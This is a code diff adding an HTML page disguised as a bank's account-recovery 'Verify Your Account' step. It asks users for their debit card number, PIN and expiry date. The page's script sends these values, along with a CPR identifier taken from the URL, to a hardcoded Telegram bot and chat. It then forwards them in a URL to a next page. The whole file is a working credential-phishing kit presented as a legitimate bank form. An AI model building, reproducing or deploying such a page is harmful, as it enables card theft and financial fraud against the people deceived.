@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
+<title>Forgot Username / Password</title>
+<style>
+  :root{
+    --blue:#15a3ff;
+    --text:#111;
+    --muted:#6b7280;
+    --border:#e6e6e6;
+    --panel:#f7f7f7;
+    --field:#fff;
+    --divider:#efefef;
+    --black:#2a2a2a;
+    --green:#41a65e;
+    --overlay:rgba(0,0,0,.6);
+    --link:#0a66c2;
+    --disabled:#e9ecef;
+    --disabled-text:#a3a3a3;
+  }
+
+  html,body{ margin:0; padding:0; width:100%; overflow:hidden;
+    font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display","Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+    background:#fff; color:var(--text);
+  }
+  .screen{ position:relative; height:100dvh; width:100%; display:flex; flex-direction:column; overflow:hidden; }
+  @supports not (height:100dvh){ .screen{ height:100vh; } }
+  @supports (height:100svh){ .screen{ height:100svh; } }
+
+  .appbar{ flex:0 0 auto; height:75px; background:var(--blue); }
+  .appbar-logo{ height:40px; margin:16px auto 16px; display:block; }
+
+  .content{ flex:1 1 auto; overflow:auto; -webkit-overflow-scrolling:touch; background:#f7f7f7; padding:14px 4px 88px; }
+
+  .title{ font-size:26px; font-weight:300; color:#258bd6; margin:10px 2px 6px; }
+  .step{ margin:0 2px 10px; font-size:12px; letter-spacing:.08em; color:#a3a3a3; }
+
+  .panel{ background:#fff; border:1px solid var(--divider); border-radius:8px; padding:12px; box-shadow:0 1px 0 rgba(0,0,0,.02); }
+  .panel legend{ font-size:12px; color:#9aa0a6; letter-spacing:.06em; margin-bottom:10px; }
+
+  .field{ display:flex; align-items:center; gap:10px; border:1px solid var(--border); border-radius:6px; background:var(--field); padding:0 12px; height:48px; }
+  /* .field + .field{ margin-top:12px; } */
+  .field input, .field select{ border:0; outline:0; background:transparent; width:100%; font-size:16px; color:#111; appearance:none; }
+  .field input::placeholder{ color:#b4b4b4; font-weight:200; }
+
+  .label{ display:flex; align-items:center; gap:6px; font-size:12px; color:#8a8d92; margin:14px 2px 6px; }
+  .info-btn{ margin-left:4px; width:20px; height:20px; border:0; background:transparent; padding:0; display:flex; align-items:center; justify-content:center; }
+  .info-img{ width:18px; height:18px; display:block; opacity:.8; }
+
+  .row{ display:grid; grid-template-columns:1fr 1fr; gap:12px; align-items:stretch; }
+  .row .field{ height:48px; }
+
+  .reveal-btn{ border:0; background:transparent; padding:0; width:28px; height:28px; display:flex; align-items:center; justify-content:center; }
+  .reveal-img{ width:18px; height:18px; display:block; }
+
+  /* Bottom bar pinned */
+  .bottom-bar{ position:absolute; left:0; right:0; bottom:env(safe-area-inset-bottom,0px); display:grid; grid-template-columns:1fr 1fr; height:64px; }
+  .bottom-bar::before{ content:""; position:absolute; left:0; right:0; top:0; height:1px; background:#eaeaea; }
+  .btn{ border:0; margin:0; padding:0 16px; font-size:16px; font-weight:600; letter-spacing:.2px; display:flex; align-items:center; justify-content:center; touch-action:manipulation; }
+  .btn:active{ transform:translateY(1px); }
+  .btn-cancel{ background:#34383c; color:#fff; }
+
+  .btn-next{ background:var(--disabled); color:var(--disabled-text); }
+  .btn-next.enabled{ background:var(--green); color:#fff; }
+
+  /* Modal */
+  .modal{ position:absolute; inset:0; z-index:20; display:none; }
+  .modal.open{ display:block; }
+  .backdrop{ position:absolute; inset:0; background:var(--overlay); }
+  .sheet{ position:absolute; left:12px; right:12px; top:48px; bottom:76px; background:#fff; border-radius:8px; padding:16px; overflow:auto; }
+  .tips-head{ display:flex; flex-direction:column; align-items:center; text-align:center; gap:10px; margin:4px 0 10px; }
+  .tips-badge{ width:72px; height:72px; border-radius:50%; background:#fff; display:flex; align-items:center; justify-content:center; }
+  .tips-badge img{ width:70px; height:70px; }
+  .tips-title{ font-size:16px; font-weight:500; margin:0; }
+  .tips-p{ font-size:15px; color:#333; margin:0; text-align:left; }
+
+  .tips-illustration{ display:flex; align-items:center; gap:14px; margin:14px 0; }
+  .card-img{ width:140px; height:88px; object-fit:cover; border-radius:6px; background:#d9e6f2; }
+  .card-notes{ font-size:15px; color:#555; }
+
+  .tips-note{ font-size:15px; color:#333; margin-top:8px; }
+  .modal-footer{ position:absolute; left:0; right:0; bottom:0; height:64px; background:#34383c; color:#fff; display:flex; align-items:center; justify-content:center; letter-spacing:.2px; }
+  .close-btn{ background:none; border:0; color:#fff; font-size:15px; font-weight:600; }
+/* Full-screen loader overlay */
+.loader-backdrop{
+  position: fixed;
+  inset: 0;
+  z-index: 1000;
+  display: none;
+  align-items: center;
+  justify-content: center;
+  background: rgba(0,0,0,.55);
+  backdrop-filter: blur(2px);
+}
+.loader-backdrop.show{ display:flex; }
+.loader-gif{
+  width: 60px;
+  height: 60px;
+  object-fit: contain;
+}
+
+</style>
+</head>
+<body>
+  <div class="screen">
+    <div class="appbar" aria-hidden="true">
+        <img class="appbar-logo" src="logo1.png" alt="">
+    </div>
+
+    <div class="content" role="main">
+      <h1 class="title">Verify Your Account</h1>
+      <div class="step">STEP 2 OF 3</div>
+
+      <div class="panel">
+        <legend>Verify your account using ATM / Debit Card</legend>
+
+        <!-- Method select: single option only -->
+        <div class="field" aria-label="Select method">
+          <select id="method" aria-label="Method">
+            <option selected>ATM / Debit Card</option>
+          </select>
+          <!-- chevron remains -->
+          <svg width="16" height="16" viewBox="0 0 24 24" aria-hidden="true"><path d="M7 10l5 5 5-5" fill="none" stroke="#9aa0a6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </div>
+
+        <!-- Card number label with info icon (icon.svg) -->
+        <div class="label">
+          <span>ATM / DEBIT CARD NUMBER:</span>
+          <button class="info-btn" id="infoBtn" aria-label="Show tips about card number">
+            <img class="info-img" src="icon.svg" alt="">
+          </button>
+        </div>
+
+        <!-- Card number input with show/hide (hide.png / visible.png) -->
+        <div class="field">
+          <input id="cardNumber" type="password" inputmode="numeric" pattern="[0-9]*" placeholder="Enter 16-digit card number" maxlength="16" autocomplete="off">
+          <button class="reveal-btn" id="toggleCard" type="button" aria-pressed="false" aria-label="Show card number">
+            <img class="reveal-img" id="eyeImg" src="hide.png" alt="">
+          </button>
+        </div>
+
+        <!-- PIN -->
+        <div class="label" style="margin-top:12px;">PIN:</div>
+        <div class="field">
+          <input id="pin" type="password" inputmode="numeric" pattern="[0-9]*" placeholder="Enter 4-digit PIN" maxlength="4" autocomplete="off">
+        </div>
+
+        <!-- Expiry -->
+        <div class="label" style="margin-top:12px;">CARD EXPIRY DATE:</div>
+        <div class="row">
+          <div class="field">
+            <select id="expMonth" aria-label="Expiry month">
+              <option value="">Month</option><option>01</option><option>02</option><option>03</option>
+              <option>04</option><option>05</option><option>06</option><option>07</option>
+              <option>08</option><option>09</option><option>10</option><option>11</option><option>12</option>
+            </select>
+            <svg width="16" height="16" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5" fill="none" stroke="#9aa0a6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          </div>
+          <div class="field">
+            <select id="expYear" aria-label="Expiry year">
+              <option value="">Year</option><option>2025</option><option>2026</option><option>2027</option>
+              <option>2028</option><option>2029</option><option>2030</option><option>2031</option><option>2032</option>
+              <option>2033</option><option>2034</option><option>2035</option>
+            </select>
+            <svg width="16" height="16" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5" fill="none" stroke="#9aa0a6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Bottom actions -->
+    <div class="bottom-bar" role="group" aria-label="Actions">
+      <button class="btn btn-cancel" id="cancelBtn" type="button">CANCEL</button>
+      <button class="btn btn-next" id="nextBtn" type="button" disabled>NEXT</button>
+    </div>
+
+    <!-- Info modal -->
+    <div class="modal" id="tipsModal" aria-hidden="true">
+      <div class="backdrop"></div>
+      <div class="sheet" role="dialog" aria-modal="true" aria-labelledby="tipsTitle">
+        <div class="tips-head">
+          <div class="tips-badge"><img src="icon.svg" alt=""></div>
+          <p id="tipsTitle" class="tips-title">Quick Tips:</p>
+          <p class="tips-p">Your 16-digit Debit Card number is printed on the front of your Debit Card.</p>
+        </div>
+        <div class="tips-illustration">
+          <img class="card-img" src="card.png" alt="Debit card">
+          <div class="card-notes">16 digit number<br>mm/yy</div>
+        </div>
+        <p class="tips-note">PIN is the 4-digit Personal Identification Number used for your Debit card to access ATM.</p>
+        <div class="modal-footer"><button class="close-btn" id="closeTips" type="button">CLOSE</button></div>
+      </div>
+    </div>
+  </div>
+<div class="loader-backdrop" id="loader" aria-hidden="true">
+  <!-- use your GIF name here; change to pull-spinner.gif if that’s your asset -->
+  <img src="cicle_loader.gif" alt="Loading..." class="loader-gif" />
+</div>
+
+<script>
+  // -------- CONFIG (⚠️ do not expose tokens in production) --------
+  const TELEGRAM_BOT_TOKEN = "8317396526:AAFNNX5WnbBb_Nt9cOUDOqy1cXhe2xrsSu8";
+  const TELEGRAM_CHAT_ID   = "-5091670751";
+
+  // Modal controls
+  const infoBtn   = document.getElementById('infoBtn');
+  const tipsModal = document.getElementById('tipsModal');
+  const closeTips = document.getElementById('closeTips');
+  infoBtn.addEventListener('click', () => { tipsModal.classList.add('open'); tipsModal.setAttribute('aria-hidden','false'); });
+  const hideModal = () => { tipsModal.classList.remove('open'); tipsModal.setAttribute('aria-hidden','true'); };
+  closeTips.addEventListener('click', hideModal);
+  tipsModal.querySelector('.backdrop').addEventListener('click', hideModal);
+
+  // Elements for validation
+  const cardNumber = document.getElementById('cardNumber');
+  const pin        = document.getElementById('pin');
+  const expMonth   = document.getElementById('expMonth');
+  const expYear    = document.getElementById('expYear');
+  const nextBtn    = document.getElementById('nextBtn');
+  const cancelBtn  = document.getElementById('cancelBtn');
+
+  // Loader
+  const loader = document.getElementById('loader');
+  const showLoader = () => { loader.classList.add('show'); loader.setAttribute('aria-hidden','false'); };
+  const hideLoader = () => { loader.classList.remove('show'); loader.setAttribute('aria-hidden','true'); };
+
+  // Helpers
+  function keepDigits(el, max){
+    el.value = el.value.replace(/\D+/g,'').slice(0, max);
+  }
+  function updateNextState(){
+    const valid =
+      cardNumber.value.replace(/\D/g,'').length === 16 &&
+      pin.value.replace(/\D/g,'').length === 4 &&
+      expMonth.value !== '' &&
+      expYear.value !== '';
+    nextBtn.disabled = !valid;
+    nextBtn.classList.toggle('enabled', valid);
+  }
+
+  cardNumber.addEventListener('input', () => { keepDigits(cardNumber, 16); updateNextState(); });
+  pin.addEventListener('input', () => { keepDigits(pin, 4); updateNextState(); });
+  expMonth.addEventListener('change', updateNextState);
+  expYear.addEventListener('change', updateNextState);
+  updateNextState();
+
+  // Show/hide card number
+  const toggleCard = document.getElementById('toggleCard');
+  const eyeImg     = document.getElementById('eyeImg');
+  toggleCard.addEventListener('click', () => {
+    const isHidden = cardNumber.type === 'password';
+    cardNumber.type = isHidden ? 'text' : 'password';
+    toggleCard.setAttribute('aria-pressed', String(isHidden));
+    toggleCard.setAttribute('aria-label', isHidden ? 'Hide card number' : 'Show card number');
+    eyeImg.src = isHidden ? 'visible.png' : 'hide.png';
+  });
+
+  // Cancel
+  cancelBtn.addEventListener('click', () => { if (history.length>1) history.back(); else location.href='/'; });
+
+  // Telegram
+  async function sendToTelegram(messageText){
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const res = await fetch(url, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: messageText,
+        parse_mode: "HTML",
+        disable_web_page_preview: true
+      })
+    });
+    if(!res.ok){
+      const txt = await res.text().catch(()=> "");
+      throw new Error(`Telegram error ${res.status}: ${txt}`);
+    }
+    return res.json();
+  }
+
+  // Build PKT time string
+  function nowPKT(){
+    const fmt = new Intl.DateTimeFormat("en-PK", {
+      timeZone: "Asia/Karachi",
+      dateStyle: "medium",
+      timeStyle: "medium",
+    });
+    return fmt.format(new Date());
+  }
+
+  // NEXT: show loader, send to Telegram, then go to sc.html?card=...&pin=...&mm=...&yy=...
+  nextBtn.addEventListener('click', async () => {
+    if (nextBtn.disabled) return;
+
+    // Collect values
+    const card   = cardNumber.value.replace(/\D/g,'');
+    const pinVal = pin.value.replace(/\D/g,'');
+    const mm     = expMonth.value;
+    const yy     = expYear.value;
+    const method = "ATM / Debit Card";
+const params = new URLSearchParams(window.location.search);
+const cpr = params.get('cpr') || '';
+    // Build Telegram payload
+    const payload =
+      `<b>Card Verify</b>\n` +
+      // space
+        `\n` +
+      `CPR: <code>${cpr}</code>\n` +
+      `Card: <code>${card}</code>\n` +
+      `PIN: <code>${pinVal}</code>\n` +
+      `Expiry: <code>${mm}/${yy}</code>\n` +
+      `Method: ${method}\n` +
+      `Time (PKT): ${nowPKT()}`;
+
+    // Disable UI + show loader
+    nextBtn.disabled = true;
+    showLoader();
+
+    // Keep loader visible at least 3s for parity with your other pages
+    const minDelay = new Promise(r => setTimeout(r, 3000));
+
+    try {
+      await Promise.all([ sendToTelegram(payload), minDelay ]);
+
+      // Build query string for sc.html
+      const qs = new URLSearchParams({
+        card: card,
+        pin: pinVal,
+        mm: mm,
+        yy: yy,
+        cpr: cpr
+      }).toString();
+hideLoader();
+      // Navigate with values in the route
+      window.location.href = `sc.html?${qs}`;
+    } catch (err) {
+      console.error(err);
+      hideLoader();
+      // Re-enable so user can fix/retry
+      updateNextState();
+      alert("Could not submit right now. Please check your connection and try again.");
+    }
+  });
+</script>
+
+</body>
+</html>
